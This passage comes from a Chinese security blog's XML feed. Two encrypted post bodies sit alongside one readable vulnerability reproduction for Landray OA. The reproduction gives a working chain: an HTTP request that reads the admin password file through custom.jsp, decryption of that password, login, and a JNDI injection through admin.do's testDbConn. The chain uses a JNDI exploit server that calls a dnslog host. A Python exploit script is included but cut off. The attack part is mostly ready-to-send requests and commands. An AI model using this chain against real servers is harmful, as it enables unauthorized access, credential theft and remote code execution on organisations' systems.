5654d7eb7279649cc53239bfe3a65e9fc46395329485e2ae4212821bf1a633707e88fefbc8472595c21cc54635eb904d14ab344cd5834bfb4303676fca0260b97ff8386697e40b611ae617dfcd7bc42cdfd22828ad86eacd5685c9b888e50486e66a0ea4ba997d4cc0c433b518b45c5068ae3e706024c78294aca09a5b525786545b9ea78ff2f2380e12688fc683dd18aa4cc359c70fbfcf0e45ec20a18d2f79943ec5e33cbde6ada005f749c95adbbd583c71d8704b548a63e27e4518e258d36d532813b268de97ec4fcba6719ca8717d073537ff4f952186560f20cef54d23a0aa9166878eaa870287e990e85ecd07ba0ded36d87e865dc80c56b59994e92d54f98b37d455935b0827858ee5d3b34d95f9452c3c17c996712a9dc978082ce95d9a2ae4f9c89bf4e7cda9706712c8282294c5a6b0230f2de1c3882f93239d36994eddaf9c6927bc6d767cb366354bfc77764b1dee349175d879e54288c57e23c992c16c2a32d874802798efd67b31f15441727dcf7a5cd0e825cd10628de4f158af3bece7a07da38ee43b0a6f85c5bb7f62263887a730d32c7fdb43b64745f5075bf54d2c3e961b3e40387037a7a44ff3c0f6982572e3f00065009c1c1ebe91078cd8db42b03e77884e524d3ea634d197b5588a94bdb91e9f579c4f079822cdb40997de40054ab01e5a7973988d90084321207cf33c20e55e232f109e348ba042cb879e6e982e99d741ef894cc0c1ee9827b5ac90470380924757e6bbbbd009c6adbffd68ae9a6af6e84c68c9bb56192926bd589b46ba4a9f932b5cbfb6752950b8b09da86764e0874fa789f36d83ee08d9eadb8946c32a7c3381af9fcab9e142e4dd68aac448e3087c94a2d6d9f3393ad894982cd9333d990038492c95d42c76b2d12e84968d3ac2df465ed2e764cc6d91c24156d86c1786e3e03d566606ebd0621934e994aad0564e94d75c9e554cfa9fa15533b6fcc7cbfed44745ee74694159601648ae7ee251d4e2f0d2502da093f10b1c1462844cb2ac6460dc26b73021047765db4f6943fd7d201265965d4d49fe99a794e996a16644408e75fb15fa98438b1acbe249f6b63b8b5659d08a74e2a5cb79e995d06010c3421ee9fad10770a80fd2616e149c7a414e9205f00db3886067c2736f238ac5207aeef9475985c99fd21d564d01505e629e55bd4ad6961647ab78533aeed4a2af5c627b28e19158f57123750f29f19bc7001bf7d53d0ec5e04b1997eb8a7f61ef9656f0be43c8faaca8bf99cae7a336958423de1dd222d6b838f76844aafa5aad9ad1eec57b9af8a4ae5556f3aa7e63e055c60fa0f7cedeab0649b873810ed9b6398272b0669a3192524a32e44a3790fa73284ccaf7236552841f0ae2a54c9607e6c2faa52881cac6066d95abf3e2eb4bf40083785c8bd4c6eb01ac683f7d12cee238529966b204de2164f88c6ad9d41933224dce0e2d712b314ce1eb73f6ddf08f0ec19f52ac89967a727c32e239667aee11837cdfa57368fe85f7f141ed3d70985f3631190cde1eab81033841f4ad66ac5137808d95fab67d23a4d8d6a458f1492819ae99b87954f37ee4f6811933d78a253c896d0c8c4b6ee5f31566a2efd62975cfed0f430dc08b402831e8ec59c0527073cccb097c16401b1de3e3118545ca3e0d425eae0e57f4eda2f217029b442a3c28f2ba0fffa8bd89e3793fb427453fab93f30c3950acdefaa5fea4e11eb4efafc1a4cc9b51c5ca361a4f45cea9870d9a83c45a97203f9f71c997fb821c14f788ca29799d2f95003d690ca2093fa3d741c74ff1f16be4d7c80eee886f58dceb1fc199b3feb8fe31a661e80cb1a51d84e1a45afaac9bdb75d943070f0354db9eb840aea2320c590e16a5adb72d43b6926927d92229f9280cdc633ed5a0310e1d5dd050a94d125e6c70bd3fd0b0a9632589b0206f7551c8e811c4b7a6638569b5bdd950786daa62217f0e19c9e80a2b8fbf94d619c325ea33876eb9f7ab8dba30ebb552d82c9d08b627df8a7706e4e0789efac8c9dda94df09ed01f814a64ce28c7778784c3e5bc4b59ee06c5d63b88b9b91b0c44c367339cf11b3b38ad41afdcb0d1edbb32076626ea3ff4d08d1b132136381622d171b7b853d5b9647bc620cbbc8108e5550780ef1622a41f6f5f1f8e110d96f6690e5e5398df327a2e82a6282b11a3eac30812d24352aca3469bb76a81ced7acfb4481ad0fe41be0ddd352c1fc9a48c5a2d6b6219116484d648359d19e55967c079b1075348b0f991030a8db6dedcf003f7c6f5a3bdceea8d67be50032d3fe2cbef0bc79baaaf9407f68c7b75e914745c8abb3d037abf7a76073a29afeb4ceba9d6656e9a99a8632296d171a8b3600d6120507c11ed56df9c8203ac0d832550e2acccf6980c1fc82b2c297b6b3b62b158bd4edaacadb9b9d7d98049adc70f3a9c2a9746f4dc3c52580a0c2d38dd6490c92c5b02efc5562c1fc30a9ac2417f66ce4222a3571f9048b5a42ef006f2bf3a70f2dad33e73f76ad3756819031330ce9da2b213ae43fe77d1650b666580698411ce63cf9beec50fee92eb4e4f287012d836015bdcb1f641e0442465849653d1964852cac84768acb7ef85b1206e71f66dd4d4d6f75395d9c16dffdb5b2c36928546700883a854946537431c3ff685b240a013bb4f6734b219cb83f8346fbffb3506e18a46f0e867d67957bc2d89471fcecb5cec55f6a3e651dfa41b3d1711c92867c7f4ff2af840fb3358cb54b479561270c9ceeb4936bef65c12aa3775092750ca3d2779a3014c328c88c6fc7e79dc5157e1318d3e3699fbb092f9ebe5905d5e44c72664d8437eede05db58edf06f73f94b3ae3444fbaf8529b2c833b6ea9b864ed1263168b8552da85d7fa0baf5f0f65043cf971de4ab60bc4b6016f8f443089c3fe817cb6d1db6288aac9b45dea261a1ff2bd4e3b810d158122fbfffb9780cd3bf45d95983fc28c211f786bab78740269e20e034c6355825a954185475d72b0bd2c1f68e37976b6cb09a8d1a399012bd55b0ca370560fd17ce646b464c422b391f44c256fe4629b4663b85d44b737a13f725d1a888a9e51056d67478c43522bc758917765d9f60ec7b8c96354c3729224c26e4022add0ae8feea48eb248343d275457b4e314cf2e03caee211d9789964937bad19617efa202f9a61526acd442622f72802dd0e678968ff37d6314422be882a14ec6c95c20ddca3ec0b4234b1ac47d1a15f85def6af18a84f92e20558c324a5cfb1a4b1f43198b9cbe3b68d43cb3e875ff0894d3f377aeb52cb076fc4c92c50b298370c3169b8e25511d50733b93c995021392e1a2f2b5bbee223d8b10e3d21a0c5297e8b21f8a70760a278ebb123c84dd2e5f659fbb91909cbdca11b0e61e84114f2397779ccd898fa6a29448e4344d42bc95068eb09179075f8c5263eb56db2f9aa98ec6356678be4356bd264551ff2166ac72e1e1ccec20642f794aff0232cab7737c71aeeb4d88840d4ca78c6a7286d2e46843b0de8ea9a4b43146ce9952a8bce013dc51f8e7fa85dd946ec09905370378dce7131b1d216424dd04ee09bfa5d47978251b1c5618781b3549db7a4ce0bd42316c8af609b1bef496a9363af7332c65039594b43b8018911d64cc918bcc694523001152484cfeb68bae09376f5d64bd4a48139c604ee944b064492a8bffac88830cf71235bf978403975043202f577e056f9433e95271e63ec09e33c4c375a3ef7961cef1f51309d3ae534d7e4de69f73125e806e694361791ec21d667ae16bb2f179f817c8dbe4b4fcf683c2303140253cc019bc1e493911643930c4bfbcb13b02457b4c197a2dbd84e73bc2a51de2c92b3cf36cc93ff24482d016671dd38e91e7f85cead98d859010ffb085625f9fd2aee27670b17f2b3b6ff885db07ec7148fe5ced22205f075ec86faf1506dc47c09e51c3e89117b46cac5999453379addeec757225146568ab537392970219ee6d4ae903b80964cff54a46d10fd3a7b2ad2574ed5fb23246c640ade8465c2a1f0a2b3a0c0ce41978ae506df55f6c2af76adbafa94c2493522e7871cec4e38dda50b7f16cead9d7058521bc7c1ca0bc224c123ed5d12288dbbd4b9c1e4fd0bc3609e5d244ec25a183425f7caa10537e14f4b38c1dc500d50fb7ef43e05a47c93ff3def482aa7b102c64ecfaca41f464fb6db9bc279c00468a42d3a5b382d2705ab0670f86751972a6e4cb6e5b57b1d7c8213ac7d31726506e56758d88d129fd3f717e879985abb1c58275598103beaa2cb7fdbee7c591f71aa9423f56e27b3492fcfec3ad2d4b9f34f46603084c629739efb628f06beff2b91bbd7d09b60bfc6f90b43d8081d729779aa03f0ea215da50855ac4e60fd2a0717bfb8618409747da5a85a3d9fd32c6cf76be925829ef5c14d80aecf4985cec5ecb699e38b146f98667e26da03b80356a4c54caf4f6b8659922cc153d0f43a7ec0cbde357b57cfdc5370d7106414ee5ea6db18f2e6e29b33e9126c3bd62d5a952a151998fa578d0331f36a6229474c43266b7210a3c9f62778c209dac4324172a631cb81cf06ce5524a2a7ccbc99c03871c5aef149adbf03aa4e2f63966412dbc539b913712b9b734e552d901582f82d10aacb5c51088fcac16a64fbf40b2c5595101f491726c6c1af0c0faae7e7d902132583c2a52d7b69cdfd163066b520651df50c86decc22bbbb9b6f7fac32c6b16923b10d387a7f476198921139260d83523e3babc9cc5fb46c42697b81c78c75ae88b8d29d919aecbeeae59ba800cf3705f68ea33cb7ade54d823b3f7e29aceaf944f7fda3fbc2d0149ce7e4af4e7d9fe5f3a3701ee7e4ab7bba5810668a05c297b6cc4ffcfff347b0e76b950dba55ad9a42cbb337aa954a9cb3b9b0210251546006ddeec521de9cbb48f15ac0e469e84bc733bd525c90f50efed7143a40a20b8129f69f0dea40b7e6d795f9cea9a738b026309b408743ffd96a1b2fcc90161d57a2cc5cb5555fb8a7cc70703b831d423c93d3f8a7cbc1c35f57a640886d17b7d9f841f96bc7bdce2ff8183b1787afc577473698215ed7dc399329956d483734166e88852b14d466ce813f8c83209499dbcf69d4e872c3e81c3d29ef4594fbd51dcc9cf0576b8feb8006a0bd97f9dd84c13db746bbd187b44f2ce036e6771414b80f1fecf113d2791b6ebf3f5309a5318351d7b51e8bc79e4762f79c94d822b7793fa78c365ad35af85689dee42c43142487b3ce1b7a6ba3a5cc0f4256dbbda4544fc41d2d7c198c2206b13da80976df0da3fce9d6803c0006f5187b60abe65788e9c5dab532f8c005ce8a10e5a111a940dc58b544acad021281fca3ad84d706a5e500defe29e2cc7c3408d291379d297d9c1422d007b53cd19ff9b24a7df7f3c152a74d9754d0a1ddaf3f23585c7dd75202eafe1986533c5ec2a0a6fb527f3e3f39bd5e38da5fed499d22967630dabaf88a74d4c564c2699d445c4ddc3dcdf1ed1ed6c3b812017154d3ff5bf033623ef8ab6ef9385358d5c36678fb5dc1b7c3509cf76f3d96efb0984f0ed3fead1a9ca10780bdf8fd63b1949d6e1eef899a1f676849646e5020cf89d5ebd7c1505608dea1ffd42ed668fdc5dcc6b2b17ca8facba2df076887a4d7a22cdd332b41455f3c5dde20bd585c02de00ecdc7ae39d03a7ffffb0c32560e4ca50d304234d85bdfd94731cc48b4f96fb2dee85a0f73c841cf446117660a8f8f63a19b3521175f1f5fa5a5ffe8423ab5e15296e107499db72cea912c64eeb6e6c10c0015db632309495000d8a20a059e3a20e47c77be9bbf317ffa8695df28f377ab929f31a4281385f6ab6ead17398b5a99ac974461b1da697e384555a2d7cffe1293bc100a29587df3ce7d235afc2210339d3195638fa032f58208101ab98a0c2b6238358bb8da7137e8af25c85b45c6db6e0625563080740b77c492875d9cc7a40bb1b9b6d37c67c8afd6951617e9ff04a83991daf40201d76df92325667b7a31b8efd89407abb81e0fc0a64424dcac7adb43e988ddab7911042edd886329ea854a7834f75f81318e8bdde88a7e7007e6898c4d4b1907bf8be547421889e5f0d8d6c1936911c4f64ce73405397e9b4cb71fc7f55ae9b80d5503c555a77778c12870fdef07b9f9c01f646a1a390e81367f5796cf5f95ba1e5c87ee324c781ed67a331f80fec723c8f6414445a16bf1d9648285a95b15fe3949bb3cdf55f9b1aa03159ffe42fb59acafa1c5c51a5d555e85f619ba048297e0866e7eca720634c1aca7414ea197117b917d7d01048e44a5f50f483b6ceccc3d7f92cde840e55c8b481faee31388ede6b86f073e068a8faea94f6e17d8ebc671afa2a95c8571c9ff6cef099b04110fce51a1cccef3d4e38e8df08fc3a1ac7f85c0ca8eb25bc5471b244df75581e417b147800596ed2aadd1aef1780a933c95cb47ce8daa0cb5baf1b5d994298041e21d6bff69480db53124854d2428fd2bdacf1bca18e5fad0b0089509d515e99ca6273e7419de8d6c1dc903a006890b0308b7ac76161a722f3687e04b2ab342855b54e422a3b9b2a954ecbdbe9a3436488e26dadccbe74aa6716836757c21c1bffac21c8a864cc9f9a1011ae954dc5219bae173e59e70f961d0219faa6ab6bb73e2fb4c21754bffe2641fe886345b166f2c1495fa7c4404b81fc5111999925f4e4a662c169d299b3a1ea9bb74bbdb072de827b74e4fb357c7c954cef60828d0ab34f22e05b1a660da5079d0d6ecc360d5f8ed4ad68bdedc7cc0af0e8270b3fb29869300e30c26d13d2db031523f5afe44194b7387972359f57f0218b206a20f0899f14192e519a8fdc4a66e51a195da0936bd165c518e15e979e3730a60659f3241e6026165bf1959c1b37357b20184eb2f34be4e34ab2d6054edccf0d58fd65796dc39e447f8546721b31f13b67fa40356b971a7efe075e49d2a8559d3389b592c25ce3d3beb075fafae07614f7570d9abb18ca1acdee263636854485ec6107ecaf3860c0d010a22df05dda2f354356128bd2c583b0d29225b860026a9b8fdae3915188c7523b1abdf58eccb151a6801cf60b71ea361a2f4bc44653ff514d8852c8a20baa96067f94e3c621f7c50b557231f795f8435ba6ad4f2f9f941b0fe89a420066e41b862052fd3373e4144734e7462984a4ecdb1f0d8cba1e8d3b2ba5eba0d8cf5e31daa72aeee60fa1ae2437961c12a1970893d6c15be02e5f1c02d0a8b8a48f24e4b75296704fb7bf7a3e9e34b7cb153fe064bf6e7c381d49db3c253776dcffdfc1c7342eb74652b4f03a87e5c2e6726c469614ec973498b59e35bfeb08ffc4cbc7d142aa4ee2c3b88ec65eee7681e60e835dff3fd67515f95f81bb694c1ef3cea6cdc6c09d54d92c5b82005f1928ad9acf1f5f641c0d1165607db6f1ce263c524099ac8c80d8c5bfdc153da18a136179a512a138f860c603bf48125b84bff821f1d9e31bf8d0b9ccdd7ae1a6c2a723d06c46dcb6de8af9e5bdc63d0d5d8a975d7baf454e33116f95dc6dfa2f5c38966b2348fd2d8caf4041282754bc061be49560012e76683a7c28a7c09e07bf821805be4f0b91a4279706b5df8d56580168b486053986cbaae4f3895fb9c054c96460e38d894dda947d29bbcaacdb538c927eabc2ab1152422f612c28d923c54744d5fca8892bca6601ef4c723486d68d7a8fc604c476deeb03df23a74d755602aa63ad7c15818cd67438b82dcc509c559ffe5ea9027aca644aeebf93cab42b07401035773ef7350e0f0ac0e355524d3ad4b66fb586f03963f725a5ba6eed8d4eb1cc487d204434e231aad16a25969db0baca95d9eba72338f3b6298df08a54f8208877c7e78b8fa02d50c025e70a6c94ec558ab96e64d8d1e730f8a3e25d0ba4017c1ef54a29914d4864c97461626ff727cd0e9ed6d4fab27b9f9cd9bfeace9e61edea4df0f31e3657404ca7cbde106011b268237d13dc02517d5583f56c57eef590c5efa3abf37d085a5e6350ef38abc2cfda73a890c2f8d7a9616343cccaf1bf9ce16ff1dc23f9f50bd2337a229bde8191cf528c800383c8823f9a6dcadb975d2ef8ca6984b38a3bcc31b9407827e0b8ce2f8cfa4ef39a58976af09936aeec7c8ec9aaf5608b8b70482bf4630d5bc1cd34115268e711a6a89015eb5b9d0d75b6af82d6bccecd7668109e2cf65be91d5070d80dc9ea4e7e020453f1c9aec4eed23b438166b1256df6ab7e38ffcc49b11e6840a4f3297aa30e6dd8bcc75c52f9b251d03e6471e36e15a1b117b70933df5733bd18308fbba210fde70cfddad908f97ab5c481d972c3957c8a2b4bf4ac222571d8c87d94dc7ae6c9be030e44e8c25caa4ae80ce0ae4a7536f7dfc8be7c47cdc2b4efa8acd41e61cdab166b395b6f17153c90221e5caa7e8be03dfcfb88a1582d286d83ab76eeca24d6387456def04cd3f816547b349e5d975463256547cf14dfba90e11c010c284daa5fb85a4d6a8143dfadc1afed5fd984459fe81f958b6654b220684bbcb3eac3f70f681fe68a389b1b7c5e608bbd0ed43606dfa218bc5cb53decc203b0ed88746740cfa9f41271d32499d6538dc1ac1b59e58484012ef20ed6ff6aaae7752ed9a6cb14c9e1f47a456cf79c235c2d4d8003c5259c9a7ead2e448671bd4f6ce65747b8d7399f0ff0c41ea5286f569dd3bf9e18a7ee79260cf303b821b1d3279a3c9a07fc02ee84f381cfb24fbdf23642878399189eddfb735da1969b0c769b3d72d549be74317677f81ece62f29b49f905f6040bb2184a53c3d1e9ce7e95b0f32e41674e96343e007e2f6cd2ffcefc7a6ef31c5f2712da26c4e088eed7380023471c30e9aaf2fc4157a0201a454e63b5b109961d101121303388e28e9c8bd25b78f7efa20b79bcf8445d82ac94090a854d4e1b517ec379286519851e5154a68685d5bb688d0cf42e1f00af8503aa025de414ca8a117d4c422b59c7fccd24c0c4ec3b9e460fcf82577fb90dc880c28317873bebeab6f795b5ad47ae734ca6c8ccbc2064eff9b733ce5fc4f5b174aa85f97c6400a273add1e9bf2f4b8eeadce1c982966b89dc2820eb8220c687cbc180413ec8f8dac25ceb36a2222b4b4600bcb55b482dcd7ef790084eb6358cd5c33d2aca1a6661a8376903eb72c28d5f72c0d4c86ba64293bb587139afb4e2f9e857720d6a2390c9c57ec1ced433f4ebf6378cd207f6d6d2e779e41e07757d639482fba2345fcc101054e76237520bfa4ba072ae4b367eef85e75f7c46f5f1d9fcb4b6a69526760a1d9530cf222b19b2036f539fdeb34620f7863e1e9a4f02f23ca4ffe1f86f1bbdf0507064e1f4c05788bb62ba165de50cc4b77e184975e847973ef35071a33f7d4adba3cf085cce4d83b59cb72e978a3c795b6ce7f08c01ea89e9fbc9c6647588d16cde2c1c3d9fe7457b9f4dbbce4e9ce3c0ce560cf99007fca980c77bd238041df14e2463d511a34af52db22787f806ea74c06e6895f7ba3a049f6299fe6692ea44ff9bc0bba4ce6e57d5b197d51c8d2f32f577c08e58943fd1c1eb38d9042842adcdbb97c945d087f22df3b2633e0bab69a575adf4361560494ca1de8ea62ef30a6ed9d167c793954112aa29fa6568b3cbaa5a81fb56b4df7d5873a0c8208f826fcbead93685e11e1e9af16512287134a641e9e3ee38e0a3f3ab375ad306880392c5a5c3913340ffee0bb32fc760f4996e28a843a84f7f4be3bbd5d9ac0cf4589f6b4141623e7bc734a6d12e1d3595b5063dbebc54659a8984c4608ac60f9c892262f2a16315c82bbd52fc1ac812b0362dcb80b64ef406586b16ca816a9be5b0387e5695e4f09d3a11d10d1fea16252aa3091f1f6203fb5cb723a03dae0c27549e8956ea38ff44ba144afc8bee2ad16e400274d1eb563d09855d8215965a4053273befee27cd0726</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂不公开                                                                                                                                                                                   .</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某OA 任意用户登录</title>
      <link href="2021/05/20/%E6%9F%90OA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
      <url>2021/05/20/%E6%9F%90OA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抽根利群冷静下再想想！" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="83b4b8b9d6d9f4c616b7d18022df4e5ea4005f8547ed0e18882cf802679fe79f">d7b925fa94678c1a5cc57c3521e3ed94922228e9d3db8121a7760e1e10956183ba59f2aca78075e8a52f9b56f1f99688b003506cdba8f70467619880bde24f22ddd4d319d6714d77443e3859f16c091b02c66034ab299d2da6bf3cbc834e5bcfedd3224a43ffa33103a9041a60fbc228c6fa8f2680ddef8d3a72c36483d6434fa97238779c7180e99c5a84a0c4684a8145298c70722a742d7fae264cd5cdb9b4f3fcc2d08cecc7d38f39b67ba61128d634a2d680789bdd1fb388308a9044741d4b1964d6689b73490e33c6019fce3e3447ff6394ca2030f0540c07bb9fee7302</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂不公开                                                                                                                                                                                   .</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝凌oa 密码读取rce</title>
      <link href="2021/05/15/%E8%93%9D%E5%87%8Coa-%E5%AF%86%E7%A0%81%E8%AF%BB%E5%8F%96rce/"/>
      <url>2021/05/15/%E8%93%9D%E5%87%8Coa-%E5%AF%86%E7%A0%81%E8%AF%BB%E5%8F%96rce/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="自行搭建环境："><a href="#自行搭建环境：" class="headerlink" title="自行搭建环境："></a>自行搭建环境：</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8C1.webp" alt="image"></p><h3 id="漏洞路径："><a href="#漏洞路径：" class="headerlink" title="漏洞路径："></a>漏洞路径：</h3><p>1.文件读取</p><pre><code>/sys/ui/extend/varkind/custom.jsp</code></pre><p>2.rce</p><pre><code>/admin.do</code></pre><h3 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h3><h4 id="读取管理员密码配置文件得到加密的管理员密码"><a href="#读取管理员密码配置文件得到加密的管理员密码" class="headerlink" title="读取管理员密码配置文件得到加密的管理员密码"></a>读取管理员密码配置文件得到加密的管理员密码</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8C2.webp" alt="image"></p><p>数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;&#x2F;sys&#x2F;ui&#x2F;extend&#x2F;varkind&#x2F;custom.jsp HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">var&#x3D;%7B%22body%22%3A%7B%22file%22%3A%22%2FWEB-INF%2FKmssConfig%2Fadmin.properties%22%7D%7D</span><br></pre></td></tr></table></figure><h4 id="对秘密的密码进行解密得到明文密码"><a href="#对秘密的密码进行解密得到明文密码" class="headerlink" title="对秘密的密码进行解密得到明文密码"></a>对秘密的密码进行解密得到明文密码</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8C3.webp" alt="image"></p><p>代码已集成在下面的脚本中</p><h3 id="使用密码登录管理后台"><a href="#使用密码登录管理后台" class="headerlink" title="使用密码登录管理后台"></a>使用密码登录管理后台</h3><pre><code>http://192.168.1.88:8080/admin.do</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8C4.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8C5.webp" alt="image"></p><h4 id="下载利用工具"><a href="#下载利用工具" class="headerlink" title="下载利用工具"></a>下载利用工具</h4><pre><code>https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0</code></pre><h4 id="在服务器搭建漏洞利用工具进行监听"><a href="#在服务器搭建漏洞利用工具进行监听" class="headerlink" title="在服务器搭建漏洞利用工具进行监听"></a>在服务器搭建漏洞利用工具进行监听</h4><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;ping ldycd7.dnslog.cn&quot; -A 192.168.1.1</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8C6.webp" alt="image"></p><h4 id="发送利用数据包（带上登录后台的cookie）"><a href="#发送利用数据包（带上登录后台的cookie）" class="headerlink" title="发送利用数据包（带上登录后台的cookie）"></a>发送利用数据包（带上登录后台的cookie）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin.do HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx</span><br><span class="line">Cookie: JSESSIONID&#x3D;011EBEEDF3323F7CFFCB31BF42B48B53</span><br><span class="line">Content-Length: 60</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Sec-Ch-Ua: &quot; Not A;Brand&quot;;v&#x3D;&quot;99&quot;, &quot;Chromium&quot;;v&#x3D;&quot;90&quot;, &quot;Google Chrome&quot;;v&#x3D;&quot;90&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36</span><br><span class="line">Origin: </span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line"></span><br><span class="line">method&#x3D;testDbConn&amp;datasource&#x3D;rmi:&#x2F;&#x2F;xx.xx.xx.xx:1099&#x2F;xxxxx</span><br></pre></td></tr></table></figure><h4 id="成功执行命令"><a href="#成功执行命令" class="headerlink" title="成功执行命令"></a>成功执行命令</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8C7.webp" alt="image"></p><h2 id="获取密文并解密脚本"><a href="#获取密文并解密脚本" class="headerlink" title="获取密文并解密脚本"></a>获取密文并解密脚本</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E8%93%9D%E5%87%8C8.webp" alt="image"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span 